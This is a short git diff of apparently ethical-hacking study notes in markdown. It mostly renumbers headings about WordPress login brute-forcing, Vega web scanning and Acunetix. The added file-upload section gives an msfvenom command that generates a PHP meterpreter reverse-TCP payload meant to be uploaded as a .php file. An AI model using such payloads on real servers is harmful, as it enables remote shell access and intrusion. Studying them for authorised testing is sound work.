@@ -327,18 +327,20 @@ msf auxiliary(wordpress_login_enum) > exploit
 ```
 - To launch Remote Desktop Connection, navigate to ```Start--> Windows Accessories--> Remote Desktop Connection```
 
-### 5)Web Appn Framework
+### 5)Web Application Framework
 <details>
 <summary> Auditing </summary>
 
 #### Tools: Vega(Linux)
 - Enter URL --> select Injection and Response modules --> click yes --> check Scan summary
-</details>
 
-### x) WVS 
+
+###  WVS 
 #### Tool: Acunetics WVS
 
-### y) File Upload Vulnerbility
+</details>
+
+### 6) File Upload Vulnerbility
 -  ``` msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw ```  
 - This command will generate a php raw payload.
 - copy the payload and make a .php file
